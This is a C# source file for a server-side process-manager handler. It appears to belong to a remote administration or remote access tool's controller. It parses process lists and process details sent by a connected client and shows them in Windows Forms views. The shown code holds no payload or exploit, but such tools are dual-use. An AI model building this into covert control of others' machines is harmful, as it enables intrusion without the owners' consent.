using PacketLib;
using Server.Forms;
using Server.Forms.UtilsForm;
using Server.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handlers
{
    internal class HandleProcessManager
    {
        public HandleProcessManager(_Client _Client, MsgUnpack msgUnpack) 
        {
            ProcessManagerForm processManagerForm = (ProcessManagerForm)Application.OpenForms["ProcessManager:" + msgUnpack.GetAsString("UID")];
            if (processManagerForm != null)
            {
                if (processManagerForm._Client == null)
                {
                    processManagerForm._Client = _Client;
                    processManagerForm.ConnectionCheckup.Start();
                }
                processManagerForm.Invoke(new MethodInvoker(() =>
                {
                    switch (msgUnpack.GetAsString("Command"))
                    {
                        case "List":
                            {
                                string[] processes = msgUnpack.GetAsString("Processes").Split(new[] { "-=>" }, StringSplitOptions.None);
                                processManagerForm.processView.Items.Clear();
                                processManagerForm.processIcon.Images.Clear();
                                processManagerForm.processView.BeginUpdate();
                                int processCount = 0;
                                for (int x = 0; x < processes.Length - 1; x++)
                                {
                                    string randomIconName = Helpers.Random();
                                    ListViewItem listViewItem = new ListViewItem();
                                    listViewItem.Text = processes[x];
                                    listViewItem.SubItems.Add(processes[x + 1]);
                                    listViewItem.SubItems.Add(processes[x + 2]);
                                    listViewItem.SubItems.Add(processes[x + 3]);
                                  
                                    if (processes[x + 4].Trim() != "N/A") 
                                    {
                                        Image icon = Image.FromStream(new MemoryStream(Convert.FromBase64String(processes[x + 4])));
                                        processManagerForm.processIcon.Images.Add(randomIconName, icon);
                                        listViewItem.ImageKey = randomIconName;
                                    }
                                    else
                                    {
                                        if(!processManagerForm.processIcon.Images.ContainsKey("RequireAdmin"))
                                            processManagerForm.processIcon.Images.Add("RequireAdmin", Properties.Resources.requireAdminIcon);
                                        listViewItem.ImageKey = "RequireAdmin";
                                    }
                                    listViewItem.Tag = processes[x + 1];
                                    processManagerForm.processView.Items.Add(listViewItem);
                                    processCount++;
                                    x += 4;
                                }
                                processManagerForm.processLbl.Text = $"[ {(processCount).ToString().PadLeft(2, '0')} ] Processes";
                                processManagerForm.processView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
                                processManagerForm.processView.EndUpdate();
                                processManagerForm.HideWait();
                                break;
                            }
                        case "Info":
                            {
                                string processInfo = msgUnpack.GetAsString("Data");
                                byte[] iconBytes = msgUnpack.GetAsByteArray("Icon");
                                if (string.IsNullOrEmpty(processInfo)) return;
                                ProcessManager_InfoForm processManager_Info = new ProcessManager_InfoForm();
                                processManager_Info.Text = "ProcessInfo: " + msgUnpack.GetAsString("ProcessName") + " | " + msgUnpack.GetAsString("ProcessId");
                                if (iconBytes == null)
                                    processManager_Info.processIcon.Image = Properties.Resources.requireAdminIcon;
                                else
                                    processManager_Info.processIcon.Image = Image.FromStream(new MemoryStream(iconBytes));
                                processManager_Info.processInfoTxtBx.Text = processInfo;
                                processManager_Info.Show();
                                break;
                            }
                    }                
                }));
            }
        }
    }
}
